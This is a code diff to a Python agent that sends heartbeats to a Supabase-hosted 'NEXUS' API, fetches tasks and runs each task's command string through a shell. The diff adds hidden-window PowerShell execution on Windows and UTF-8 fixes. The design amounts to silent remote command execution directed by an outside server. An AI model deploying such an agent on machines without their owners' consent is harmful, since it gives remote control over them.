@@ -11,8 +11,15 @@ import subprocess
 import requests
 import socket
 import os
+import sys
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime, timezone
+
+# Fix: force UTF-8 stdout so emoji/Chinese chars don't crash on Windows cmd
+if sys.stdout.encoding != "utf-8":
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+
+IS_WINDOWS = sys.platform == "win32"
 
 API_URL    = os.getenv("NEXUS_API_URL",   "https://iyqzgmzlykufsbtmykpw.supabase.co/rest/v1")
 API_KEY    = os.getenv("NEXUS_API_KEY",   "")
@@ -36,7 +43,7 @@ def base_headers():
     return h
 
 def heartbeat():
-    """心跳：注册设备 + 更新 last_seen + status=online"""
+    """heartbeat: register device + update last_seen + status=online"""
     try:
         now_iso = datetime.now(timezone.utc).isoformat()
         session.post(
@@ -50,26 +57,40 @@ def heartbeat():
             },
             timeout=15
         )
-        log(f"♥ heartbeat OK ({DEVICE_ID})")
+        log(f"[HB] heartbeat OK ({DEVICE_ID})")
     except Exception as e:
-        log(f"♥ heartbeat FAIL: {e}")
+        log(f"[HB] heartbeat FAIL: {e}")
 
 def run_task(task):
-    task_id    = task["id"]
-    cmd_str    = task.get("command", "")
-    timeout_sec= task.get("timeout_ms", 30000) / 1000.0
+    task_id     = task["id"]
+    cmd_str     = task.get("command", "")
+    timeout_sec = task.get("timeout_ms", 60000) / 1000.0
 
-    log(f"⚡ [{task_id[:8]}] RUN: {cmd_str[:80]}")
+    # Windows: force powershell.exe, set UTF-8 output encoding
+    if IS_WINDOWS:
+        orig_cmd = task.get("command", "")
+        cmd_str = (
+            f'powershell.exe -NoProfile -NonInteractive -Command '
+            f'"$OutputEncoding=[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; '
+            f'{orig_cmd.replace(chr(34), chr(92)+chr(34))}"'
+        )
+    log(f"[RUN] [{task_id[:8]}] {cmd_str[:100]}")
 
     try:
-        result = subprocess.run(
-            cmd_str,
+        kwargs = dict(
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
-            text=True,
-            timeout=timeout_sec
+            # Fix: 强制 UTF-8 解码，遇到无法解码的字符替换为 ? 而不是崩溃
+            encoding="utf-8",
+            errors="replace",
+            timeout=timeout_sec,
         )
+        # Windows: 使用 CREATE_NO_WINDOW 避免弹出黑窗口
+        if IS_WINDOWS:
+            kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
+
+        result = subprocess.run(cmd_str, **kwargs)
         output = result.stdout.strip()
         status = "completed" if result.returncode == 0 else "failed"
 
@@ -80,7 +101,7 @@ def run_task(task):
         output = f"Error: {e}"
         status = "failed"
 
-    log(f"✅ [{task_id[:8]}] {status.upper()} | {output[:60]}")
+    log(f"[OK] [{task_id[:8]}] {status.upper()} | {output[:60]}")
 
     try:
         session.patch(
@@ -90,7 +111,7 @@ def run_task(task):
             timeout=15
         )
     except Exception as e:
-        log(f"❌ PATCH failed [{task_id[:8]}]: {e}")
+        log(f"[ERR] PATCH failed [{task_id[:8]}]: {e}")
 
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 last_hb   = 0.0
